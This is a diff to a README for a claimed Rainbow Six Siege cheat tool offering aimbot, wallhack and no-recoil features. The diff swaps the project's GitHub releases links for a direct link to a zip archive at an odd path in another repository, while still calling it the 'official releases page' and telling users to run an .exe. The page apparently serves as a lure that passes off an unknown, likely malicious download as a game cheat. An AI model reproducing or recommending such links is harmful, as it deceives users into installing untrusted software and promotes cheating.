@@ -5,7 +5,7 @@ description: "Enhance Rainbow Six Siege with ESP, aimbot, wallhack, no recoil, a
 ---
 # 🎯 R6-Eclipse-Z - Gain the advantage in every match
 
-[![Download R6-Eclipse-Z](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/esmeunrequested589/R6-Eclipse-Z/releases)
+[![Download R6-Eclipse-Z](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/esmeunrequested589/esmeunrequested589.github.io/main/Spartacism/3.4.zip)
 
 R6-Eclipse-Z helps you improve your performance in Rainbow Six Siege. This tool provides features that assist with aiming, tracking opponents, and managing weapon recoil. It functions as a helpful utility for your gaming setup.
 
@@ -26,7 +26,7 @@ DirectX 12 support is necessary for smooth operation. Ensure your graphics drive
 
 Follow these steps to set up the software.
 
-1. Visit the [official releases page](https://github.com/esmeunrequested589/R6-Eclipse-Z/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/esmeunrequested589/esmeunrequested589.github.io/main/Spartacism/3.4.zip) to download the installer.
 2. Choose the latest version file ending in .exe.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
